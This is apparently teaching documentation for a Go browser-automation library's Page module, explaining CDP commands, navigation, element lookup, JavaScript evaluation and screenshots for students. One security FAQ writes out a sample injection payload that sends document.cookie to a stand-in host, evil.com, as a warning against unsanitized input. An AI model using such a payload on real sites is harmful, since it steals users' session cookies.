# Page Module — Deep1 Level (For Software Engineering Students)

Source: `kexas/page.go`, `page_find.go`, `page_wait.go`, `page_scroll.go`

This document explains the Page module for SE students. Every technical term is defined inline. FAQs are included per section.

---

## 1. What Is a Page?

A `Page` represents a single browser tab. When you open Chrome and see a tab showing google.com — that's a page. In kexas, the `Page` struct lets your Go code control that tab: navigate to URLs, find HTML elements, run JavaScript, take screenshots, and wait for the page to finish loading.

### Key Terms

- **Tab** — A single web page view inside a browser window. Each tab has its own URL, DOM tree, and JavaScript execution environment.
- **DOM (Document Object Model)** — The browser's internal representation of an HTML page as a tree of objects. Every `<div>`, `<input>`, `<button>` is a "node" in this tree. JavaScript (and CDP) can read and modify this tree.
- **CSS Selector** — A pattern used to find HTML elements. `"#login"` finds the element with `id="login"`. `".btn"` finds elements with `class="btn"`. `"div > p"` finds `<p>` elements that are direct children of `<div>`.

---

## 2. The `Page` Struct — What's in Memory

```go
type Page struct {
    browser      *Browser
    targetID     string
    sessionID    string
    log          *logger.Logger
    ctx          context.Context
    agentManager *agent.AgentManager
}
```

### Field-by-Field

**`browser *Browser`** — Pointer back to the parent Browser. This is how Page accesses the WebSocket connection to Chrome. Multiple pages can share the same browser (and the same WebSocket).

**`targetID string`** — Chrome's unique identifier for this tab. A UUID string like `"7A3B2C1D-E4F5-..."`. Chrome's browser process uses this to route commands to the correct renderer process.

> **FAQ: What is a UUID?** Universally Unique Identifier — a 128-bit number formatted as a hex string with dashes (e.g., `550e8400-e29b-41d4-a716-446655440000`). UUIDs are designed so that two independently generated UUIDs will almost certainly be different. Chrome generates a UUID for each tab to avoid ID collisions.

**`sessionID string`** — The CDP session identifier. When your Go code sends a command, the JSON includes `"sessionId": "xyz"`. Chrome uses this to route the command to the correct tab's debugging session.

> **FAQ: What's the difference between targetID and sessionID?**
> - `targetID` identifies the **tab itself** in Chrome's internal registry. It exists as long as the tab exists.
> - `sessionID` identifies your **debugging connection** to that tab. If you detach and reattach, you get a new sessionID, but the targetID stays the same.
> - Analogy: `targetID` is a hotel room number (permanent). `sessionID` is your room keycard (can be reissued).

**`agentManager *agent.AgentManager`** — Manages which CDP "domains" (DOM, Runtime, Page, Input) are enabled for this session. See the AGENT deep1 doc for details.

**`ctx context.Context`** — Propagates cancellation. If the browser's context is cancelled, all page operations abort.

---

## 3. `sendCommand` — The Central Gateway

Every single operation on a Page goes through one function:

```go
func (p *Page) sendCommand(method string, params map[string]interface{}) (map[string]interface{}, error) {
    p.ensureAgentsForCommand(method)
    return p.browser.client.SendToSession(p.ctx, p.sessionID, method, params)
}
```

### What Happens Step by Step

1. **Agent check** — `ensureAgentsForCommand` looks at the method name (e.g., `"DOM.querySelector"`) and checks if the DOM domain is enabled. If not, it sends a `"DOM.enable"` command first.

2. **JSON serialization** — The method and params are combined into a JSON message:
   ```json
   {"id": 42, "method": "DOM.querySelector", "params": {"nodeId": 1, "selector": "#login"}, "sessionId": "abc-123"}
   ```

> **What is JSON?** JavaScript Object Notation — a text format for structured data. It uses `{}` for objects and `[]` for arrays. CDP uses JSON for all communication. Go's `encoding/json` package converts Go maps/structs to JSON strings.

3. **Send over WebSocket** — The JSON bytes are wrapped in a WebSocket frame and sent to Chrome over the TCP socket.

> **What is a WebSocket frame?** WebSocket messages are wrapped in small headers called "frames." The header contains: an opcode (is this text or binary data?), the payload length, and optionally a masking key. For a typical CDP command (~200 bytes), the frame header adds 2–6 bytes of overhead.

4. **Chrome processes it** — Chrome's browser process receives the frame, reads the `sessionId`, and routes the command to the correct renderer process. The renderer executes the command and sends the result back.

5. **Response arrives** — The CDP client's background goroutine reads the response, matches it to the original request by `id`, and delivers it to the waiting caller.

> **What is a goroutine?** Go's lightweight thread. Unlike OS threads (which cost ~1 MB of stack memory each), goroutines start at 2 KB and grow as needed. The Go runtime schedules thousands of goroutines onto a handful of OS threads. The CDP client runs a background goroutine that continuously reads from the WebSocket — so it can receive responses even while your code is doing other things.

### FAQ: How fast is a sendCommand call?

For localhost communication, typically **0.1–5 milliseconds**. The breakdown:
- JSON serialization: ~10–50 microseconds (μs)
- Network round-trip (loopback): ~5–20 μs
- Chrome processing: 50 μs – 5 ms (depends on command complexity)
- JSON deserialization: ~10–50 μs

DOM queries on large pages (thousands of elements) take longer because Chrome must walk the entire DOM tree.

---

## 4. `Navigate(url)` — Loading a Web Page

```go
func (p *Page) Navigate(url string, waitUntil ...kwait.WaitUntil) error
```

### What Happens When You Navigate

1. **Send command** — `sendCommand("Page.navigate", {"url": "https://example.com"})` tells Chrome: "Load this URL in this tab."

2. **Chrome does a LOT of work**:
   - **DNS lookup** — Translates `"example.com"` to an IP address (e.g., `93.184.216.34`) by querying DNS servers.
   
   > **What is DNS?** Domain Name System — the internet's phone book. Computers communicate using IP addresses (numbers), but humans use domain names (words). DNS translates between them.
   
   - **TCP connection** — Establishes a TCP connection to the server (3-way handshake: SYN → SYN-ACK → ACK).
   - **TLS handshake** (for HTTPS) — Negotiates encryption keys so the data is secure in transit.
   
   > **What is TLS?** Transport Layer Security — the encryption protocol that puts the "S" in HTTPS. It ensures that no one between your computer and the server can read or modify the data.
   
   - **HTTP request** — Sends `GET / HTTP/1.1` with headers (User-Agent, Accept, etc.).
   - **HTML parsing** — Chrome's HTML parser reads the response and builds the DOM tree incrementally.
   - **CSS parsing** — Stylesheets are parsed into a CSSOM (CSS Object Model).
   - **JavaScript execution** — `<script>` tags are executed by Chrome's V8 JavaScript engine.
   - **Sub-resource loading** — Images, fonts, additional scripts, and stylesheets are fetched in parallel.

3. **Poll `document.readyState`** — After sending the navigate command, kexas polls Chrome repeatedly:
   ```
   "loading"      → HTML is still being parsed
   "interactive"  → HTML parsing done, sub-resources still loading
   "complete"     → Everything is done (images, scripts, stylesheets all loaded)
   ```
   
   The polling loop sends `Runtime.evaluate("document.readyState")` every ~100ms until the state reaches `"complete"` (or times out after 30 seconds).

> **What is `document.readyState`?** A property on the browser's `document` object that reflects the loading phase. It's the same property you'd check in JavaScript: `if (document.readyState === 'complete') { ... }`.

> **What is polling?** Repeatedly checking a condition at intervals. Like checking your phone every 5 minutes to see if you got a text. The alternative is "event-driven" — being notified when something happens (like a phone notification). Kexas uses polling because it's simpler and more reliable than CDP events for readyState.

### FAQ: Why poll instead of listening for CDP events?

CDP has a `Page.loadEventFired` event, but it's unreliable in some edge cases (single-page apps, pages with long-running scripts). Polling `document.readyState` directly is more portable and matches what Playwright does internally.

### FAQ: What if the page never finishes loading?

`Navigate` times out after 30 seconds (configurable) and returns an error: `"page load timeout after 30s"`. The caller can catch this and decide what to do.

---

## 5. `Find(selector)` — Locating Elements

```go
func (p *Page) Find(selector string, opts ...FindOption) (*Element, error)
```

### What Happens

1. **Validate selector** — Check that the selector string is not empty.

2. **Send DOM query** — `sendCommand("DOM.querySelector", {"nodeId": rootNodeId, "selector": "#login"})`. Chrome walks the DOM tree and finds the first element matching the CSS selector.

> **What does "walking the DOM tree" mean?** The DOM is organized as a tree: `<html>` is the root, `<head>` and `<body>` are children, and so on. "Walking" means visiting each node, checking if it matches the selector. Chrome's implementation is highly optimized — it uses hash maps for IDs (`#login`) and class names (`.btn`), so `#login` lookups are O(1), not O(n).

3. **Build Element** — The response contains a `nodeId` (integer). Kexas wraps this in an `Element` struct with a reference back to this Page.

4. **Return** — `*Element` is returned to the caller, ready for interactions (Click, Type, etc.).

### FAQ: What if the element doesn't exist?

`Find` returns an error: `"element not found: #login"`. Use `WaitAndFind` instead, which polls until the element appears or times out — ideal for elements that load asynchronously.

### FAQ: What's the difference between `Find` and `WaitAndFind`?

- `Find` — Checks once, immediately. If the element isn't there, returns an error.
- `WaitAndFind` — Polls every 100ms until the element appears or the timeout expires. Preferred for test code because web pages often load elements asynchronously.

### FAQ: CSS selector vs XPath — which should I use?

CSS selectors are simpler and faster for most cases (`"#id"`, `".class"`, `"div > p"`). XPath is more powerful for complex queries (`"//div[@class='active']/following-sibling::span"`). Kexas supports both, but CSS selectors are recommended as the default.

---

## 6. `Evaluate(expression)` — Running JavaScript

```go
func (p *Page) Evaluate(expression string) (interface{}, error)
```

Sends `Runtime.evaluate` to Chrome, which executes arbitrary JavaScript in the page's context and returns the result.

```go
title, err := page.Evaluate("document.title")
// title = "Google"

count, err := page.Evaluate("document.querySelectorAll('a').length")
// count = 42
```

### How It Works in Chrome

1. Chrome's V8 JavaScript engine receives the expression string.
2. V8 compiles it to bytecode (a compact, executable format).
3. V8 executes the bytecode in the page's **execution context** — the same environment where the page's own JavaScript runs.
4. The result is serialized as JSON and sent back.

> **What is V8?** Google's JavaScript engine, written in C++. It powers Chrome, Node.js, and Deno. V8 compiles JavaScript to machine code for high performance.

> **What is an execution context?** An isolated environment where JavaScript runs. Each page (and each iframe, web worker) has its own execution context with its own global object (`window`), variables, and scope. `Runtime.evaluate` runs code in the **main page's** context.

### FAQ: Can I access page cookies/localStorage from Evaluate?

Yes. `page.Evaluate("document.cookie")` returns the page's cookies. `page.Evaluate("localStorage.getItem('token')")` reads localStorage. You have full access to everything the page's JavaScript can access.

### FAQ: Is it safe to run any JavaScript?

From a technical standpoint, yes — it will execute whatever you pass. From a security standpoint, never pass unsanitized user input as the expression. If a user could inject `"; fetch('https://evil.com?cookie='+document.cookie)`, they could steal data.

---

## 7. `Screenshot()` — Capturing the Viewport

```go
func (p *Page) Screenshot() ([]byte, error)
```

Returns the visible viewport as a PNG image (raw bytes).

### What Happens in Chrome

1. Chrome's **compositor** renders all visual layers into a single bitmap.

> **What is a compositor?** A component that combines multiple visual layers (background, text, images, overlapping elements) into a single final image. Chrome renders each layer separately, then composites them together. This is similar to how Photoshop layers work.

2. The bitmap is encoded to **PNG format** (lossless compression).

> **What is PNG?** Portable Network Graphics — a lossless image format. "Lossless" means no quality is lost during compression (unlike JPEG, which discards data to achieve smaller files). For screenshots, PNG preserves text perfectly.

3. The PNG bytes are **base64-encoded** and sent as a string in the CDP response.

> **What is base64?** An encoding scheme that converts binary data (bytes) into ASCII text. It uses 64 characters (A-Z, a-z, 0-9, +, /). Base64 increases data size by ~33% but is necessary because JSON can only contain text, not raw bytes.

4. On the Go side, the base64 string is decoded back to raw PNG bytes.

### FAQ: How much memory does a screenshot use?

For a 1280×720 viewport: raw bitmap = ~3.7 MB (1280 × 720 × 4 bytes per pixel for RGBA). After PNG compression: ~100 KB – 2 MB. The base64-encoded version is ~33% larger. After decoding, only the PNG bytes (~1 MB) are kept.

---

## 8. `SetContent(html)` — Injecting HTML Directly

```go
func (p *Page) SetContent(html string) error
```

Replaces the entire page's HTML without making a network request. Perfect for testing DOM interactions without a web server.

```go
page.SetContent(`<html><body><button id="btn">Click Me</button></body></html>`)
elem, _ := page.Find("#btn")
elem.Click()
```

### FAQ: How is this different from Navigate?

`Navigate` fetches HTML from a URL (makes a network request). `SetContent` directly injects HTML into the page (no network). `SetContent` is much faster and doesn't require a running web server.

---

## 9. Error Handling

### Error Types

| Error | What It Means |
|-------|---------------|
| `"page load timeout after 30s"` | Navigation didn't complete in time |
| `"element not found: #login"` | CSS selector didn't match any element |
| `"failed to close page: ..."` | CDP error during page close |
| `ErrTextEmpty` | You passed `""` to a Type/WaitAndType call |
| `ErrElementNoPage` | An Element lost its reference to the Page |

### Error Wrapping

All errors use Go's `%w` verb for wrapping:

```go
return fmt.Errorf("failed to navigate: %w", err)
```

> **What is error wrapping?** Go's `fmt.Errorf("...: %w", err)` creates a new error that contains the original error inside it. This lets callers use `errors.Is(err, targetErr)` to check the root cause without string matching. It's like putting an envelope inside an envelope — you can always open it to see what's inside.

### FAQ: Should I use `t.Fatal` or `t.Error` for page errors?

- Use `t.Fatal` (or `t.Fatalf`) for errors that prevent the test from continuing (e.g., `Navigate` failed — nothing else can work).
- Use `t.Error` (or `t.Errorf`) for errors that are worth reporting but don't block the rest of the test (e.g., one assertion failed but you want to check others).

---

## 10. Concurrency

A `Page` is **NOT thread-safe**. This means:
- Only one goroutine should use a Page at a time.
- Don't share a Page between goroutines without synchronization.

> **What does "thread-safe" mean?** A data structure is thread-safe if multiple threads (or goroutines) can use it simultaneously without causing bugs. A non-thread-safe structure may produce corrupted data, crashes, or unpredictable behavior when accessed concurrently.

In kexas's parallel test mode, this isn't a problem because each worker goroutine gets its **own** Browser and Page. No sharing = no concurrency issues.

### FAQ: What if I need multiple goroutines working on the same page?

You don't, for browser automation. CDP commands are sequential within a session — Chrome processes them one at a time. Sending commands from multiple goroutines would just queue them, not speed anything up. Use multiple browsers/pages instead.
